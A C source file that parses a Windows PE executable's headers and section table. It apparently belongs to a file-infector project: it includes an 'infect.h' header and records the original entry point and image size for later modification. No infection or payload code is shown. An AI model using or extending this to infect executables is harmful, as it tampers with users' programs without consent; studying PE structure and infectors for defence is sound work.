#include <stdio.h>
#include <string.h>
#include <Windows.h>

#include "type.h"
#include "pe.h"
#include "infect.h"

u32 NT_header_off;

u16 number_of_sections_old;
u16 size_of_optional_header;

u32 size_of_image_old;
u32 image_base;
u32 address_of_entry_point_old;
u32 section_alignment;
u32 file_alignment;


u32 section_tables_start;
u32 section_tables_end_old;
u32 sections_start;
u32 sections_end_old;

struct SectionHeader * section_headers; // FIXME: free this

int parse(){
    // TODO tell if the file is a pe file
    INFO("\tstart\n");
    NT_header_off = *(u32*)(file + DOS_HEADER__NT_HEADER_OFF);
    u32 file_header_off = NT_header_off + NT_HEADER__FILE_HEADER_OFF;
    u32 optional_header_off = NT_header_off + NT_HEADER__OPTIONAL_HEADER_OFF;
    
    // TODO: check 'PE\0\0' lable

    number_of_sections_old = *(u16*)(file + file_header_off + FILE_HEADER__NUMBER_OF_SECTION_OFF);
    size_of_optional_header = *(u16*)(file + file_header_off + FILE_HEADER__SIZE_OF_OPTIONAL_HEADER); 

    size_of_image_old = *(u32*)(file + optional_header_off + OPTIONAL_HEADER__SIZE_OF_IMAGE_OFF);
    address_of_entry_point_old = *(u32*)(file + optional_header_off +OPTIONAL_HEADER__ADDRESS_OF_ENTRY_POINT_OFF);
    memcpy(
        &image_base,
        file + optional_header_off + OPTIONAL_HEADER__IMAGE_BASE_OFF,
        4
    );
    memcpy(
        &file_alignment, 
        file + optional_header_off + OPTIONAL_HEADER__FILE_ALIGNMENT_OFF,
        4
    );
    memcpy(
        &section_alignment,
        file + optional_header_off + OPTIONAL_HEADER__SECTION_ALIGNMENT_OFF,
        4
    );

    // section headers:
    section_tables_start = optional_header_off + size_of_optional_header;
    section_tables_end_old = section_tables_start + (number_of_sections_old * SECTION_HEADER_SIZE);

    section_headers = HeapAlloc(GetProcessHeap(), 0, SECTION_HEADER_SIZE * number_of_sections_old);
    for(int i = 0; i < number_of_sections_old; i++){
        memcpy(&(section_headers[i]), file + section_tables_start + SECTION_HEADER_SIZE * i, SECTION_HEADER_SIZE);
        InfoSectionHeader(section_headers[i]);
    }
    sections_start = section_headers[0].PointerToRawData;
    sections_end_old = section_headers[number_of_sections_old - 1].PointerToRawData +
                       section_headers[number_of_sections_old - 1].SizeOfRawData;
    INFO("\tfinish\n");
    return 0;
}